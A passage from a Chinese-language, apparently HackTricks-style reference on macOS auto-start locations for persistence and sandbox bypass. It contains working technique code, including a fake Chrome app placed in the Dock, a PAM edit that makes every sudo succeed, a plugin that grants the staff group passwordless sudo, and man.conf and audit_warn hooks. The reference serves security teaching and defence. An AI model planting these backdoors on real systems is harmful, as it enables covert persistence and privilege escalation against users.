Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- 但你需要能够使用参数调用 `osascript`，以联系 **`System Events`**，从而配置 Folder Actions
- TCC bypass：[🟠](https://emojipedia.org/large-orange-circle)
- 它具有一些基本的 TCC 权限，例如 Desktop、Documents 和 Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- 需要 Root 权限
- **Trigger**：访问指定文件夹
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**：访问指定文件夹

#### Description & Exploitation

Folder Actions 是由文件夹中的变化自动触发的脚本，例如添加或移除项目，或者打开或调整文件夹窗口大小等其他操作。这些 actions 可用于执行各种任务，并且可以通过不同方式触发，例如使用 Finder UI 或终端命令。<sup>[17][18]</sup>

要设置 Folder Actions，你可以选择：

1. 使用 [Automator](https://support.apple.com/guide/automator/welcome/mac) 创建 Folder Action workflow，并将其安装为 service。
2. 通过文件夹上下文菜单中的 Folder Actions Setup 手动附加脚本。
3. 使用 OSAScript 向 `System Events.app` 发送 Apple Event 消息，以编程方式设置 Folder Action。
- 这种方法特别适合将 action 嵌入系统，从而提供一定程度的 persistence。

以下脚本是一个可由 Folder Action 执行的示例：
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
要使上述脚本可供 Folder Actions 使用，请使用以下命令进行编译：
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
脚本编译完成后，通过执行以下脚本设置 Folder Actions。该脚本将全局启用 Folder Actions，并专门将之前编译的脚本绑定到 Desktop 文件夹。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
使用以下命令运行 setup 脚本：
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- 这是通过 GUI 实现此 persistence 的方法：

这是将要执行的 script：
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

将其移动到：
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
然后，打开 `Folder Actions Setup` app，选择**要监视的文件夹**，并在当前情况下选择 **`folder.scpt`**（在我的例子中，我将其命名为 output2.scp）：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果使用 **Finder** 打开该文件夹，脚本就会执行。

此配置以 base64 格式存储在 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 中。

现在，让我们尝试在没有 GUI 访问权限的情况下准备此持久化：

1. **将 `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist` 复制**到 `/tmp` 进行备份：
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **移除**刚刚设置的 Folder Actions：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

现在我们拥有了一个空环境

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开 Folder Actions Setup.app 以加载此配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 但这对我不起作用，以下是 writeup 中的说明：

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- 但你需要在系统中安装 malicious application
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**：当用户点击 Dock 中的 app 时

#### Description & Exploitation

Dock 中显示的所有 applications 都在 plist **`~/Library/Preferences/com.apple.dock.plist`**<sup>[19]</sup> 中指定。

可以仅使用以下命令**添加 application**：
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
通过一些 **social engineering**，你可以在 Dock 中**冒充例如 Google Chrome**，并实际执行自己的脚本：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 需要执行一个非常特定的操作
- 你最终会进入另一个 sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Root required
- Trigger: 使用 color picker
- `~/Library/ColorPickers`
- Trigger: 使用 color picker

#### Description & Exploit

**Compile a color picker** bundle with your code（例如可以使用[**这个**](https://github.com/viktorstrate/color-picker-plus)），并添加一个 constructor（类似于[Screen Saver 部分](macos-auto-start-locations.md#screen-saver)中的做法），然后将该 bundle 复制到 `~/Library/ColorPickers`。<sup>[20]</sup>

然后，当 color picker 被触发时，你的代码也应被执行。

注意，加载你的 library 的 binary 使用了一个**限制非常严格的 sandbox**：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Useful to bypass sandbox: **No, because you need to execute your own app**
- TCC bypass: ???

#### Location

- A specific app

#### Description & Exploit

An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).

Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:<sup>[21][22]</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### 屏幕保护程序

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但最终会处于一个常见的 application sandbox 中
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/System/Library/Screen Savers`
- 需要 Root 权限
- **触发条件**：选择屏幕保护程序
- `/Library/Screen Savers`
- 需要 Root 权限
- **触发条件**：选择屏幕保护程序
- `~/Library/Screen Savers`
- **触发条件**：选择屏幕保护程序

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 描述与 Exploit

在 Xcode 中创建一个新项目，并选择模板以生成新的 **Screen Saver**。然后，将你的代码添加进去，例如使用以下代码生成日志。<sup>[23][24]</sup>

**Build** 它，并将 `.saver` bundle 复制到 **`~/Library/Screen Savers`**。然后，打开 Screen Saver GUI，只需点击它，就应该会生成大量日志：
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> 请注意，由于在加载此代码的二进制文件的 entitlements 中（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）可以找到 **`com.apple.security.app-sandbox`**，因此你将处于**通用应用程序 sandbox**中。

Saver 代码：
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但最终会处于 application sandbox 中
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- 该 sandbox 看起来限制非常多

#### 位置

- `~/Library/Spotlight/`
- **触发条件**：创建由该 Spotlight plugin 管理扩展名的新文件。
- `/Library/Spotlight/`
- **触发条件**：创建由该 Spotlight plugin 管理扩展名的新文件。
- 需要 root 权限
- `/System/Library/Spotlight/`
- **触发条件**：创建由该 Spotlight plugin 管理扩展名的新文件。
- 需要 root 权限
- `Some.app/Contents/Library/Spotlight/`
- **触发条件**：创建由该 Spotlight plugin 管理扩展名的新文件。
- 需要新 app

#### 描述与利用

Spotlight 是 macOS 内置的搜索功能，旨在为用户提供**快速且全面地访问计算机上数据的能力**。\
为了实现这种快速搜索能力，Spotlight 会维护一个**专有数据库**，并通过**解析大多数文件**来创建索引，从而能够快速搜索文件名及其内容。<sup>[25]</sup>

Spotlight 的底层机制涉及一个名为“mds”的中心进程，其含义是**“metadata server”**。该进程负责协调整个 Spotlight 服务。除此之外，还有多个“mdworker” daemon 执行各种维护任务，例如为不同的文件类型建立索引（`ps -ef | grep mdworker`）。这些任务通过 Spotlight importer plugin（即 **“.mdimporter bundles”**）实现，使 Spotlight 能够理解并索引各种文件格式中的内容。

这些 plugin 或 **`.mdimporter`** bundles 位于前面提到的位置；如果出现新的 bundle，它会在一分钟内加载（无需重启任何服务）。这些 bundle 需要声明其能够管理的**文件类型和扩展名**，这样当创建具有指定扩展名的新文件时，Spotlight 就会使用它们。

可以通过运行以下命令**查找所有已加载的 `mdimporters`**：
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例如，**/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析此类文件（包括扩展名为 `.iba` 和 `.book` 的文件）：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 如果你检查其他 `mdimporter` 的 Plist，可能找不到 **`UTTypeConformsTo`** 条目。这是因为它属于内置的 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)，统一类型标识符)，不需要指定扩展名。
>
> 此外，系统默认插件始终具有优先权，因此攻击者只能访问那些未被 Apple 自带 `mdimporters` 索引的文件。

要创建自己的 importer，可以从这个项目开始：[https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后修改名称、**`CFBundleDocumentTypes`**，并添加 **`UTImportedTypeDeclarations`**，使其支持你想要支持的扩展名，并在 **`schema.xml`** 中反映这些更改。\
然后修改 **`GetMetadataForFile`** 函数的代码，使其在创建具有目标扩展名的文件时执行你的 payload。

最后，**build 并将新的 `.mdimporter`** 复制到前面三个位置之一，然后可以通过**监控日志**或检查 **`mdimport -L.`** 来确认它何时被加载。

### ~~Preference Pane~~

> [!CAUTION]
> 看起来这已经不再有效。

技术文章：[https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- 可用于 sandbox bypass：[🟠](https://emojipedia.org/large-orange-circle)
- 需要特定的用户操作
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### 描述

看起来这已经不再有效。<sup>[26]</sup>

## Root Sandbox Bypass

> [!TIP]
> 这里可以找到一些适用于 **sandbox bypass** 的启动位置，它们允许你只需**以 root 身份将内容写入文件**，和/或满足其他**奇怪的条件**，即可执行某些内容。

### Periodic

技术文章：[https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- 可用于 sandbox bypass：[🟠](https://emojipedia.org/large-orange-circle)
- 但需要 root 权限
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/etc/periodic/daily`、`/etc/periodic/weekly`、`/etc/periodic/monthly`、`/usr/local/etc/periodic`
- 需要 root 权限
- **触发条件**：时间到达时
- `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local`
- 需要 root 权限
- **触发条件**：时间到达时

#### 描述与利用

这些 periodic 脚本（**`/etc/periodic`**）会被执行，是因为 **launch daemons** 在 `/System/Library/LaunchDaemons/com.apple.periodic*` 中进行了配置。请注意，存储在 `/etc/periodic/` 中的脚本会以**文件所有者的身份执行**，因此这无法用于潜在的权限提升。<sup>[27]</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
还有其他将被执行的周期性脚本，相关配置位于 **`/etc/defaults/periodic.conf`**：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
如果你能够写入 `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local` 中的任何文件，那么它**迟早会被执行**。

> [!WARNING]
> 请注意，periodic 脚本将以**脚本所有者的身份执行**。因此，如果脚本由普通用户拥有，它将以该用户身份执行（这可能会阻止权限提升攻击）。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要 root 权限
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 始终需要 root 权限

#### Description & Exploitation

由于 PAM 更侧重于 macOS 中的**持久化**和 malware，而不是易于执行的操作，因此本文不会提供详细说明，**请阅读 writeup 以更好地理解此技术**。<sup>[28]</sup>

使用以下命令检查 PAM modules：
```bash
ls -l /etc/pam.d
```
一种滥用 PAM 的持久化/权限提升技术非常简单：修改模块 `/etc/pam.d/sudo`，在开头添加以下行：
```bash
auth       sufficient     pam_permit.so
```
所以它会**看起来像**这样：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
因此，任何尝试使用 **`sudo` 的操作都会成功**。

> [!CAUTION]
> 请注意，此目录受 TCC 保护，因此用户很有可能会看到请求访问权限的提示。

另一个很好的例子是 su，你可以看到，也可以向 PAM modules 传递参数（并且你也可以对这个文件植入后门）：
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要 root 权限并进行额外配置
- TCC bypass: ???

#### 位置

- `/Library/Security/SecurityAgentPlugins/`
- 需要 root 权限
- 还需要配置 authorization database 以使用该 plugin

#### 描述与利用

你可以创建一个 authorization plugin，在用户登录时执行，以维持 persistence。有关如何创建此类 plugin 的更多信息，请查看之前的 writeup（并注意，编写不当的 plugin 可能会导致你无法登录，此时需要从 recovery mode 清理你的 Mac）。<sup>[29][30]</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**将 bundle 移动到要加载的位置：**
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最后添加用于加载此 Plugin 的 **rule**：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** 会告知 authorization framework，它需要**调用外部 mechanism 进行授权**。此外，**`privileged`** 会使其由 root 执行。

使用以下命令触发：
```bash
security authorize com.asdf.asdf
```
然后，**staff 组应具有 sudo** 访问权限（读取 `/etc/sudoers` 进行确认）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root，且用户必须使用 man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/private/etc/man.conf`**
- 需要 root 权限
- **`/private/etc/man.conf`**：每当使用 man 时

#### 描述与利用

配置文件 **`/private/etc/man.conf`** 指定了打开 man 文档文件时使用的 binary/script。因此，可以修改可执行文件的路径，使得用户每次使用 man 读取某些文档时都会执行 backdoor。<sup>[31]</sup>

例如，在 **`/private/etc/man.conf`** 中设置：
```
MANPAGER /tmp/view
```
然后创建 `/tmp/view`，内容如下：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root，且 apache 必须正在运行
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd 没有 entitlements

#### 位置

- **`/etc/apache2/httpd.conf`**
- 需要 root 权限
- 触发条件：Apache2 启动时

#### 描述与利用

你可以在 `/etc/apache2/httpd.conf` 中添加一行内容，以指示加载一个模块，例如：<sup>[32]</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
这样，Apache 就会加载你编译的模块。唯一需要注意的是：你要么需要使用有效的 Apple 证书对其进行**签名**，要么需要在系统中**添加新的受信任证书**，并使用该证书对其进行**签名**。

然后，如有需要，为确保服务器会启动，你可以执行：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb 的代码示例：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要成为 root、auditd 正在运行，并触发警告
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/etc/security/audit_warn`**
- 需要 root 权限
- **触发条件**：当 auditd 检测到警告时

#### 描述与利用

每当 auditd 检测到警告时，脚本 **`/etc/security/audit_warn`** 就会被**执行**。因此，你可以将 payload 添加到其中。<sup>[33]</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
你可以使用 `sudo audit -n` 强制触发警告。

### Startup Items

> [!CAUTION] > **此功能已弃用，因此这些目录中不应找到任何内容。**

**StartupItem** 是一个目录，应放置在 `/Library/StartupItems/` 或 `/System/Library/StartupItems/` 中。建立此目录后，其中必须包含以下两个特定文件：

1. 一个 **rc script**：在启动时执行的 shell 脚本。
2. 一个 **plist file**，具体名称为 `StartupParameters.plist`，其中包含各种配置设置。

确保 rc script 和 `StartupParameters.plist` 文件都正确放置在 **StartupItem** 目录中，以便启动过程识别并使用它们。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 我在自己的 macOS 中找不到此组件，因此如需更多信息，请查看 writeup

Writeup：[https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple 引入的 **emond** 是一种 logging mechanism，似乎尚未完善，或者可能已经被弃用，但仍然可以访问。虽然它对 Mac 管理员并没有特别大的用处，但这一鲜为人知的 service 可能会被 threat actors 用作一种隐蔽的 persistence method，很可能不会被大多数 macOS admins 注意到。<sup>[34]</sup>

对于了解其存在的人来说，识别 **emond** 的任何 malicious usage 都很简单。系统中用于此 service 的 LaunchDaemon 会在单个目录中查找要执行的 scripts。可以使用以下 command 进行检查：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### 位置

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- 需要 root 权限
- **触发条件**：使用 XQuartz 时

#### 描述与利用

XQuartz **已不再预装于 macOS**，因此如需更多信息，请查看 writeup。<sup>[3]</sup>

### ~~kext~~

> [!CAUTION]
> 即使拥有 root 权限，安装 kext 也非常复杂，因此我不会将其视为逃逸 sandbox 或实现 persistence 的方式（除非你拥有一个 exploit）。

#### 位置

要将 KEXT 安装为启动项，必须将其**安装在以下位置之一**：

- `/System/Library/Extensions`
- 内置于 OS X 操作系统中的 KEXT 文件。
- `/Library/Extensions`
- 由第三方软件安装的 KEXT 文件

你可以使用以下命令列出当前已加载的 kext 文件：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
有关 [**kernel extensions，请查看此部分**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers) 的更多信息。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### 位置

- **`/usr/local/bin/amstoold`**
- 需要 Root 权限

#### 描述与利用

显然，`/System/Library/LaunchAgents/com.apple.amstoold.plist` 中的 `plist` 在暴露 XPC service 的同时使用了这个 binary……问题在于该 binary 并不存在，因此你可以在该位置放置某个程序；当 XPC service 被调用时，你的 binary 就会被执行。<sup>[35]</sup>

我现在已经无法在我的 macOS 中找到它了。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### 位置

- **`/Library/Preferences/Xsan/.xsanrc`**
- 需要 Root 权限
- **触发条件**：service 运行时（很少发生）

#### 描述与利用

